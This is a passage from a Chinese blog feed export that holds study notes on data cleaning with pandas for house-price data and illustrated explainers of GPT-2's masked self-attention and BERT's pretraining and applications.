class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> currency:<br>    data[c] = data[c].replace(<br>        <span class="hljs-string">r&#x27;[$,-]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, regex=<span class="hljs-literal">True</span>).replace(<br>        <span class="hljs-string">r&#x27;^\s*$&#x27;</span>, np.nan, regex=<span class="hljs-literal">True</span>).astype(<span class="hljs-built_in">float</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 房屋面积转换</span><br>areas = [<span class="hljs-string">&#x27;Total interior livable area&#x27;</span>, <span class="hljs-string">&#x27;Lot size&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> areas:<br>    acres = data[c].<span class="hljs-built_in">str</span>.contains(<span class="hljs-string">&#x27;Acres&#x27;</span>) == <span class="hljs-literal">True</span><br>    col = data[c].replace(<span class="hljs-string">r&#x27;\b sqft\b|\b Acres\b|\b,\b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, regex=<span class="hljs-literal">True</span>).astype(<span class="hljs-built_in">float</span>)<br>    col[acres] *= <span class="hljs-number">43560</span><br>    data[c] = col<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">data.describe()<br></code></pre></td></tr></table></figure><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20211014201902092.png" class="" title="image-20211014201902092"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 过滤掉不正常数据</span><br>abnormal = (data[areas[<span class="hljs-number">1</span>]] &lt; <span class="hljs-number">10</span>) | (data[areas[<span class="hljs-number">1</span>]] &gt; <span class="hljs-number">1e4</span>)<br>data = data[~abnormal]<br><span class="hljs-built_in">sum</span>(abnormal)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 绘制房屋价格图</span><br>ax = sns.histplot(np.log10(data[<span class="hljs-string">&#x27;Sold Price&#x27;</span>]))<br>ax.set_xlim([<span class="hljs-number">3</span>, <span class="hljs-number">8</span>])<br>ax.set_xticks(<span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">9</span>))<br>ax.set_xticklabels([<span class="hljs-string">&#x27;%.0e&#x27;</span>%a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-number">10</span>**ax.get_xticks()]);<br></code></pre></td></tr></table></figure><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20211014202225216.png" class="" title="image-20211014202225216"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># the differences between different house types.</span><br>data[<span class="hljs-string">&#x27;Price per living sqft&#x27;</span>] = data[<span class="hljs-string">&#x27;Sold Price&#x27;</span>] / data[<span class="hljs-string">&#x27;Total interior livable area&#x27;</span>]<br>ax = sns.boxplot(x=<span class="hljs-string">&#x27;Type&#x27;</span>, y=<span class="hljs-string">&#x27;Price per living sqft&#x27;</span>, data=data[types], fliersize=<span class="hljs-number">0</span>)<br>ax.set_ylim([<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>]);<br></code></pre></td></tr></table></figure><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20211014202542817.png" class="" title="image-20211014202542817"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">_, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))<br>columns = [<span class="hljs-string">&#x27;Sold Price&#x27;</span>, <span class="hljs-string">&#x27;Listed Price&#x27;</span>, <span class="hljs-string">&#x27;Annual tax amount&#x27;</span>, <span class="hljs-string">&#x27;Price per living sqft&#x27;</span>, <span class="hljs-string">&#x27;Elementary School Score&#x27;</span>, <span class="hljs-string">&#x27;High School Score&#x27;</span>]<br>sns.heatmap(data[columns].corr(),annot=<span class="hljs-literal">True</span>,cmap=<span class="hljs-string">&#x27;RdYlGn&#x27;</span>, ax=ax);<br></code></pre></td></tr></table></figure><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20211014203303934.png" class="" title="image-20211014203303934"><h2 id="数据清理">数据清理</h2><ul><li>异常值</li><li>违反规则</li><li>模式冲突</li></ul>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>实用机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>李沐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(三)</title>
    <link href="/2021/09/18/nlp-transformer/nlp-transformer-3/"/>
    <url>/2021/09/18/nlp-transformer/nlp-transformer-3/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="图解gpt">图解GPT</h1><h2 id="什么是语言模型">什么是语言模型</h2><p>本文主要描述和对比两种语言模型</p><ul><li>自编码(auto-encoder)语言模型</li><li>自回归(auto-regressive)语言模型</li></ul><p><strong>自编码语言模型</strong>代表就是BERT。自编码语言模型通过随机mask输入的部分单词，然后预训练的目标是预测被mask的单词，不仅可以融入上文信息，还可以自然地融入下文信息。</p><span id="more"></span><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918200729037.png" class="" title="Bert mask"><p>自编码语言模型的优缺点</p><ul><li>优点：自然地融入双向语言模型，同时看到被预测的单词的上下文</li><li>缺点：训练和预测不一致。训练的时候引入了[mask]标记，但是在预测阶段往往没有mask标记，导致预训练阶段和Fine-tuning阶段不一致。</li></ul><p><strong>自回归语言模型：</strong>语言模型根据输入句子的一部分文本来预测下一个词。日常生活中最常见的就是输入法提示，它可以根据输入的内容，给出提示。</p><p>自回归语言模型的优点和缺点：</p><ul><li>优点：对于生成类地NLP任务，比如文本摘要，机器翻译等从左向右的生成内容，天然和自回归语言模型契合。</li><li>缺点：由于一般是从左到右(当然也可能从左到右)，所以只能利用上文或者下文地信息，不能同时利用上下文。</li></ul><p>GPT-2属于自回归语言模型，相比于手机app上的输入提示，GPT-2更加复杂，功能也更加强大。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918203321168.png" class="" title="多种GPT模型"><h2 id="基于transformer的语言模型">基于Transformer的语言模型</h2><p>原始的Transformer模型是由Encoder部分和Decoder部分组成的，它们都是由多层transformer堆叠而成的。原始Transformer的seq2seq结构很适合机器翻译，因为机器翻译正是将一个文本序列翻译为另一种语言的文本序列。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918203439661.png" class="" title="原始Transformer结构"><p>但如果要使用Transformer来解决语言模型任务，并不需要完整的Encoder部分和Decoder部分，于是在原始Transformer之后的许多研究工作中，人们尝试只使用TransformerEncoder或者Decoder，并且将它们堆得层数尽可能高，然后使用大量的训练语料和大量的计算资源（数十万美元用于训练这些模型）进行预训练。比如BERT只使用了Encoder部分进行maskedlanguagemodel（自编码）训练，GPT-2便是只使用了Decoder部分进行自回归（autoregressive）语言模型训练。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918203607920.png" class="" title="GPT,BERT,Transformer-XL"><h2 id="transformer进化">Transformer进化</h2><p>Transformer的Encoder进化成了BERT，Decoder进化成了GPT2。</p><p>首先是Encoder部分。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918203756070.png" class="" title="encoder"><p>原始的Transformer论文中的Encoder部分接受特定长度的输入（如 512 个token）。如果一个输入序列比这个限制短，我们可以使用pad填充序列的其余部分。</p><p>再回顾下Decoder部分 与Encoder相比，Decoder部分多了一个Encoder-Decoderself-attention层，使Decoder可以attention到Encoder编码的特定的信息。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918203859377.png" class="" title="decoder"><p>Decoder中的的 MaskedSelf-Attention会屏蔽未来的token。具体来说，它不像BERT那样直接将输入的单词随机改为mask，而是通过改变Self-Attention的计算，来屏蔽未来的单词信息。</p><p>例如，我们想要计算位置4的attention，我们只允许看到位置4以前和位置4的token。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918204007767.png" class="" title="attention"><p>由于BERT是基于Encoder构建的，BERT使用是SelfAttention层，而GPT2基于Decoder构建，GPT-2 使用masked SelfAttention。一个正常的 SelfAttention允许一个位置关注到它两边的信息，而masked SelfAttention只让模型看到左边的信息：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918204045901.png" class="" title="self attention and mask self attention"><p>OpenAI的GPT2中Transformer-Decoder结构。基于Transformer-Decoder部分进行语言模型训练。由于去掉了Encoder部分，于是Encoder-Decoderself attention也不再需要。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918204214467.png" class="" title="transformer-decoder"><h2 id="gpt2概述">GPT2概述</h2><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918204327430.png" class="" title="GPT2"><p>GPT-2能够处理1024个token。每个token沿着自己的路径经过所有的Decoder层。试用一个训练好的GPT-2模型的最简单方法是让它自己生成文本（这在技术上称为：生成无条件文本）。或者，我们可以给它一个提示，让它谈论某个主题（即生成交互式条件样本）。</p><p>在漫无目的情况下，我们可以简单地给它输入一个特殊的s初始token，让它开始生成单词。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918204752948.png" class="" title="GPT2初始token"><p>由于模型只有一个输入，因此只有一条活跃路径。stoken在所有Decoder层中依次被处理，然后沿着该路径生成一个向量。根据这个向量和模型的词汇表给所有可能的词计算出一个分数。在下图的例子中，我们选择了概率最高的the。下一步，我们把第一步的输出添加到我们的输入序列，然后让模型做下一个预测。</p><p>第二条路径是此计算中唯一活动的路径。GPT-2 的每一层都保留了它对第一个token所编码的信息，而且会在处理第二个 token 时直接使用它：GPT-2不会根据第2个 token 重新计算第一个 token。</p><h2 id="gpt2详解">GPT2详解</h2><p>与之前我们讨论的其他 NLP 模型一样，GPT-2在嵌入矩阵中查找输入的单词的对应的 embedding向量。如下图所示：每一行都是词的embedding：这是一个数值向量，可以表示一个词并捕获一些含义。这个向量的大小在不同的GPT-2 模型中是不同的。最小的模型使用的 embedding 大小是 768。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918205045809.png" class="" title="token embedding"><p>于是在开始时，我们会在嵌入矩阵查找第一个 token s 的embedding。在把这个 embedding传给模型的第一个模块之前，我们还需要融入位置编码，这个位置编码能够指示单词在序列中的顺序。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918205349065.png" class="" title="位置编码"><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918205418308.png" class="" title="token+position"><p>输入的处理：得到词向量+位置编码</p><h3 id="多层decoder">多层Decoder</h3><p>第一层Decoder现在可以处理 s token所对应的向量了：首先通过 SelfAttention 层，然后通过全连接神经网络。一旦Transformer的第1个Decoder处理了stoken，依旧可以得到一个向量，这个结果向量会再次被发送到下一层Decoder。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210918205515342.png" class="" title="多层编码"><h3 id="decoder中的self-attention">Decoder中的self-attention</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">机器人第2定律：机器人必须服从人给予 它 的命令，当 该命令 与 第一定律 冲突时例外。<br></code></pre></td></tr></table></figure><p>例句中包含了多个代词。如果不结合它们所指的上下文，就无法理解或者处理这些词。当一个模型处理这个句子，它必须能够知道：</p><ul><li>它 指的是机器人</li><li>该命令 指的是这个定律的前面部分，也就是 人给予 它 的命令</li><li>第一定律 指的是机器人第一定律</li></ul><p>self-attention所做的事情是：它通过对句子片段中每个词的相关性打分，并将这些词的表示向量根据相关性加权求和，从而让模型能够将词和其他相关词向量的信息融合起来。</p><h4 id="self-attention过程">self-attention过程</h4><p>Self-Attention 沿着句子中每个 token 进行处理，主要组成部分包括 3个向量。</p><ul><li>Query：Query向量是由当前词的向量表示获得，用于对其他所有单词（使用这些单词的 key向量）进行评分。</li><li>Key：Key向量由句子中的所有单词的向量表示获得，可以看作一个标识向量。</li><li>Value：Value 向量在self-attention中与Key向量其实是相同的。</li></ul><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919144732335.png" class="" title="query"><p>一个粗略的类比是把它看作是在一个文件柜里面搜索，Query向量是一个便签，上面写着你正在研究的主题，而 Key向量就像是柜子里的文件夹的标签。当你将便签与标签匹配时，我们取出匹配的那些文件夹的内容，这些内容就是Value 向量。但是你不仅仅是寻找一个 Value 向量，而是找到一系列Value向量。</p><p>将 Query 向量与每个文件夹的 Key向量相乘，会为每个文件夹产生一个分数（从技术上来讲：点积后面跟着softmax）。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919144829495.png" class="" title="score"><p>我们将每个 Value 向量乘以对应的分数，然后求和，就得到了 SelfAttention 的输出。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919144912368.png" class="" title="self-attention的输出"><p>这些加权的 Value 向量会得到一个向量，比如上图，它将 50%的注意力放到单词 robot 上，将 30% 的注意力放到单词 a，将 19%的注意力放到单词 it。</p><p>而所谓的Masked self attention指的的是：将mask位置对应的的attentionscore变成一个非常小的数字或者0，让其他单词再selfattention的时候（加权求和的时候）不考虑这些单词。</p><h4 id="模型输出">模型输出</h4><p>当模型顶部的Decoder层产生输出向量时（这个向量是经过 Self Attention层和神经网络层得到的），模型会将这个向量乘以一个巨大的嵌入矩阵（vocabsize x embeddingsize）来计算该向量和所有单词embedding向量的相关得分。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919145019792.png" class="" title="顶部的模块产生输出"><p>嵌入矩阵中的每一行都对应于模型词汇表中的一个词。这个相乘的结果，被解释为模型词汇表中每个词的分数，经过softmax之后被转换成概率。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919145122628.png" class="" title="token概率"><p>我们可以选择最高分数的 token（top_k=1），也可以同时考虑其他词（topk）。假设每个位置输出k个token，假设总共输出n个token，那么基于n个单词的联合概率选择的输出序列会更好。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919145319228.png" class="" title="选择输出"><p>这样，模型就完成了一次迭代，输出一个单词。模型会继续迭代，直到所有的单词都已经生成，或者直到输出了表示句子末尾的token。</p><h2 id="详解self-attention">详解Self-Attention</h2><p>在这里指出文中一些过于简化的说法：</p><ul><li>在文中交替使用token和词。但实际上，GPT-2使用Byte PairEncoding在词汇表中创建token，这意味着token通常是词的一部分</li><li>展示的例子实在推理模式下运行，这就是它为什么一次只处理一个token。在训练时，模型将会针对更长的文本序列进行训练，并且会同时处理多个token，同样，在训练时，模型会处理更大的batchsize，而不是使用推理时使用的大小为1的batch size。</li><li>本文图中一般使用行向量，但是有些实际上是列向量。</li></ul><h3 id="可视化self-attention">可视化Self-Attention</h3><p>一个简单的Transformer，假设它一次只能处理 4 个 token。</p><p>Self-Attention 主要通过 3 个步骤来实现：</p><ul><li>为每个路径创建 Query、Key、Value 矩阵。</li><li>对于每个输入的 token，使用它的 Query 向量为所有其他的 Key向量进行打分。</li><li>将 Value 向量乘以它们对应的分数后求和。</li></ul><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150025822.png" class="" title="self-attention的三个步骤"><p>（1）创建Query，Key，Value向量</p><p>让我们关注第一条路径。我们会使用它的 Query 向量，并比较所有的 Key向量。这会为每个 Key 向量产生一个分数。Self Attention 的第一步是为每个token 的路径计算 3 个向量。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150217882.png" class="" title="第一步"><p>（2）计算分数</p><p>现在我们有了这些向量，我们只对步骤 2 使用 Query 向量和 Value向量。因为我们关注的是第一个 token 的向量，我们将第一个 token 的 Query向量和其他所有的 token 的 Key 向量相乘，得到 4 个 token 的分数。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150304519.png" class="" title="第二步"><p>（3）计算和</p><p>我们现在可以将这些分数和 Value向量相乘。在我们将它们相加后，一个具有高分数的 Value向量会占据结果向量的很大一部分。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150404684.png" class="" title="第三步"><p>分数越低，Value 向量就越透明。这是为了说明，乘以一个小的数值会稀释Value 向量。</p><p>如果我们对每个路径都执行相同的操作，我们会得到一个向量，可以表示每个token，其中包含每个 token 合适的上下文信息。这些向量会输入到 Transformer模块的下一个子层（前馈神经网络）。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150520109.png" class="" title="汇总"><h3 id="图解masked-self-attention">图解Masked Self-attention</h3><p>Masked Self Attention 和 Self Attention 是相同的，除了第 2个步骤。</p><p>现在假设模型有2个 token 作为输入，我们正在观察（处理）第二个token。在这种情况下，最后 2 个 token是被屏蔽（masked）的。所以模型会干扰评分的步骤。它总是把未来的 token评分设置为0，因此模型不能看到未来的词，如下图所示：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919150900082.png" class="" title="maksed self-attention"><p>这个屏蔽（masking）经常用一个矩阵来实现，称为 attentionmask矩阵。依旧以4个单词的序列为例（例如：robot must obayorders）。在一个语言建模场景中，这个序列会分为 4个步骤处理：每个步骤处理一个词（假设现在每个词就是是一个token）。另外，由于模型是以batch size 的形式工作的，我们可以假设这个简单模型的 batch size为4，它会将4个序列生成任务作为一个 batch处理，如下图所示，左边是输入，右边是label。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151034459.png" class="" title="batch形式的输入和输出"><p>在矩阵的形式中，我们使用Query 矩阵和 Key矩阵相乘来计算分数。将其可视化如下。但注意，单词无法直接进行矩阵运算，所以下图的单词还需要对应成一个向量。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151448489.png" class="" title="Quert和Keys的相关矩阵"><p>在做完乘法之后，我们加上三角形的 attentionmask。它将我们想要屏蔽的单元格设置为负无穷大或者一个非常大的负数（例如GPT-2 中的 负十亿）：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151532858.png" class="" title="mask-attention"><p>然后对每一行应用 softmax，会产生实际的分数，我们会将这些分数用于 SelfAttention。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151620605.png" class="" title="softmax"><ul><li>当模型处理数据集中的第 1 个数据（第 1 行），其中只包含着一个单词（robot），它将 100% 的注意力集中在这个单词上。</li><li>当模型处理数据集中的第 2 个数据（第 2 行），其中包含着单词（robotmust）。当模型处理单词 must，它将 48% 的注意力集中在 robot，将 52%的注意力集中在 must。</li><li>诸如此类，继续处理后面的单词。</li></ul><h3 id="gpt2中的self-attention">GPT2中的Self-Attention</h3><p>模型预测的时候：每次处理一个 token</p><p>先处理第一个token a。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151823316.png" class="" title="gpt2的第一个token"><p>GPT-2 保存 token <code>a</code> 的 Key 向量和 Value 向量。每个 SelfAttention 层都持有这个 token 对应的 Key 向量和 Value 向量：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151859377.png" class="" title="gpt2中的词a"><p>现在在下一个迭代，当模型处理单词 robot，它不需要生成 token a 的Query、Value 以及 Key向量。它只需要重新使用第一次迭代中保存的对应向量：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919151953906.png" class="" title="词robot"><ol type="1"><li><p>创建Query，Key，Value矩阵</p><p>让我们假设模型正在处理单词 <code>it</code>。进入Decoder之前，这个token 对应的输入就是 <code>it</code> 的 embedding 加上第 9个位置的位置编码：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153337472.png" class="" title="处理it"><p>Transformer中每个层都有它自己的参数矩阵。embedding向量我们首先遇到的权重矩阵是用于创建Query、Key、和 Value 向量的。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153412973.png" class="" title="处理it"><p>Self-Attention 将它的输入乘以权重矩阵（并添加一个 bias向量，此处没有画出)</p><p>这个相乘会得到一个向量，这个向量是 Query、Key 和 Value向量的拼接。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153441073.png" class="" title="query，key，value"><p>得到Query、Key和Value向量之后，我们将其拆分multi-head，如下图所示。其实本质上就是将一个大向量拆分为多个小向量。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153531362.png" class="" title="multi head"><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153601375.png" class="" title="multi head"></li><li><p>评分</p><p>我们现在可以继续进行评分，假设我们只关注一个 attention head（其他的attention head 也是在进行类似的操作）。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153746482.png" class="" title="打分"><p>现在，这个 token 可以根据其他所有 token 的 Key 向量进行评分（这些 Key向量是在前面一个迭代中的第一个 attention head 计算得到的）：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153827272.png" class="" title="加权和"></li><li><p>求和</p><p>正如我们之前所看的那样，我们现在将每个 Value向量乘以对应的分数，然后加起来求和，得到第一个 attention head 的 SelfAttention 结果：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919153923491.png" class="" title="合并attentions heads"><p>multi head对应得到多个加权和向量，我们将他们都再次拼接起来：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154053712.png" class="" title="拼接"><p>再将得到的向量经过一个线性映射得到想要的维度，随后输入全连接网络。</p></li><li><p>映射</p><p>我们将让模型学习如何将拼接好的 Self Attention结果转换为前馈神经网络能够处理的输入。在这里，我们使用第二个巨大的权重矩阵，将attention heads 的结果映射到 Self Attention 子层的输出向量：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154239317.png" class="" title="映射"></li></ol><p>通过以上步骤，我们产生了一个向量，我们可以把这个向量传给下一层。</p><h3 id="gpt2全连接神经网络">GPT2全连接神经网络</h3><p><strong><em>第一层</em></strong></p><p>全连接神经网络是用于处理 Self Attention层的输出，这个输出的表示包含了合适的上下文。全连接神经网络由两层组成。第一层是模型大小的4 倍（由于 GPT-2 small 是 768，因此这个网络会有3072个神经元）。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154503863.png" class="" title="全连接层"><p><strong><em>第二层，把向量映射到模型的维度</em></strong></p><p>第 2 层把第一层得到的结果映射回模型的维度（在 GPT-2 small 中是768）。这个相乘的结果是 Transformer 对这个 token 的输出。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154605387.png" class="" title="全连接层"><h2 id="语言模型应用">语言模型应用</h2><h3 id="机器翻译">机器翻译</h3><p>进行机器翻译时，Encoder 不是必须的。我们可以用只有 Decoder 的Transformer 来解决同样的任务：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154759298.png" class="" title="翻译"><h3 id="生成摘要">生成摘要</h3><p>这是第一个只使用 Decoder 的 Transformer来训练的任务。它被训练用于阅读一篇维基百科的文章（目录前面去掉了开头部分），然后生成摘要。文章的实际开头部分用作训练数据的标签：</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154829762.png" class="" title="生成摘要"><h3 id="迁移学习">迁移学习</h3><p>在 Sample Efficient Text Summarization Using a Single Pre-TrainedTransformer(https://arxiv.org/abs/1905.08836) 中，一个只有 Decoder 的Transformer首先在语言模型上进行预训练，然后微调进行生成摘要。结果表明，在数据量有限制时，它比预训练的Encoder-Decoder Transformer 能够获得更好的结果。</p><h3 id="音乐生成">音乐生成</h3><p>Music Transformer(https://magenta.tensorflow.org/music-transformer)论文使用了只有 Decoder 的 Transformer来生成具有表现力的时序和动态性的音乐。音乐建模就像语言建模一样，只需要让模型以无监督的方式学习音乐，然后让它采样输出（前面我们称这个为漫步）。</p><p>你可能会好奇在这个场景中，音乐是如何表现的。请记住，语言建模可以把字符、单词、或者单词的一部分（token），表示为向量。在音乐表演中（让我们考虑一下钢琴），我们不仅要表示音符，还要表示速度--衡量钢琴键被按下的力度。</p><img src="/2021/09/18/nlp-transformer/nlp-transformer-3/image-20210919154944710.png" class="" title="音乐生成">]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(二)</title>
    <link href="/2021/09/16/nlp-transformer/nlp-transformer-2/"/>
    <url>/2021/09/16/nlp-transformer/nlp-transformer-2/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="图解bert">图解BERT</h1><p>BERT首先在大规模无监督语料上进行预训练，然后在预训练好的参数基础上增加一个与任务相关的神经网络层，并在该任务的数据上进行微调训，最终取得很好的效果。BERT的这个训练过程可以简述为：预训练+微调（finetune），已经成为最近几年最流行的NLP解决方案的范式。</p><h2 id="bert句子分类">BERT句子分类</h2><ul><li><p>下载在无监督语料上与训练好的Bert模型，一般对应了3个文件：BERT模型配置文件(用来确定Transformer的层数，隐藏层的大小)，BERT模型参数，BERT词表(BERT所能处理的所有token)</p></li><li><p>针对特定任务需要，在BERT模型上增加一个任务相关的神经网络，比如一个简单的分类器，然后在特定监督数据上进行微调训练。(微调的一种理解：学习率较小，训练epoch数量较少，对模型整体参数进行轻微调整)</p></li></ul><p>BERT进行句子分类，判断一个邮件是"垃圾邮件"或者"非垃圾邮件"</p><span id="more"></span><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916201227474.png" class="" title="垃圾邮件分类"><p>我们在BERT模型上增加一个简单的classifier层，由于这一层神经网络参数是新添加的，一开始只能随机初始化它的参数，所以需要用对应的监督数据来训练这个classifier。由于classifier是连接在BERT模型之上的，训练的时候也可以更新BERT的参数。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916201315406.png" class="" title="BERT句子分类"><h2 id="模型结构">模型结构</h2><p>BERT原始论文提出了BERT-base和BERT—large两个模型，base的参数量比large少一些，可以形象的表示为下图的样子。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916201401391.png" class="" title="BERT base&#x2F;large"><p>BERT模型结构基本上就是Transformer的encoder部分，BERT-base对应的是12层encoder，BERT-large对应的是24层encoder。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916201508262.png" class="" title="BERT-base的12层encoder"><h2 id="模型输入">模型输入</h2><p>BERT模型输入有一点特殊的地方是在一句话最开始拼接了一个<strong>[CLS]token</strong>，如下图所示。这个特殊的<strong>[CLS]token</strong>经过BERT得到的向量表示通常被用作当前的句子表示。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916201653599.png" class="" title="模型输入"><h2 id="模型输出">模型输出</h2><p>BERT输入的所有token经过BERt编码后，会在每个位置输出一个大小为hidden_size（在 BERT-base中是 768）的向量。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916202452414.png" class="" title="output"><p>对于上面提到的句子分类的例子，我们直接使用第1个位置的向量输出（对应的是[CLS]）传入classifier网络，然后进行分类任务，如下图所示</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916203051304.png" class="" title="分类器"><h2 id="预训练任务masked-language-model">预训练任务：Masked LanguageModel</h2><p>BERT是基于Masked languagemodel进行预训练的：将输入文本序列的部分（15%）单词随机Mask掉，让BERT来预测这些被Mask的词语。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916203432692.png" class="" title="BERT mask"><h2 id="预训练任务相邻句子判断">预训练任务：相邻句子判断</h2><p>BERt在预训练时，还引入了一个新的任务：判断两个句子是否是相邻句子。如下图所示：输入是sentenceA和sentence B，经过BERT编码之后，使用CLStoken的向量表示来预测两个句子是否是相邻句子。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916203706328.png" class="" title="2个句子任务"><h2 id="bert的应用">BERT的应用</h2><p>BERT论文展示了BERT在多种任务上的应用，如下图所示。可以用来判断两个句子是否相似，判断单个句子的情感，用来做抽取式问答，用来做序列标注。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210916205038216.png" class="" title="BERT应用"><h2 id="bert特征提取">BERT特征提取</h2><p>由于BERT模型可以得到输入序列所对应的所有token的向量表示，因此不仅可以使用最后一程BERT的输出连接上任务网络进行微调，还可以直接使用这些token的向量当作特征。比如，可以直接提取每一层encoder的token表示当作特征，输入现有的特定任务神经网络中进行训练。</p><img src="/2021/09/16/nlp-transformer/nlp-transformer-2/image-20210917144435739.png" class="" title="BERT特征提取"><h1 id="拓展">拓展</h1><h2 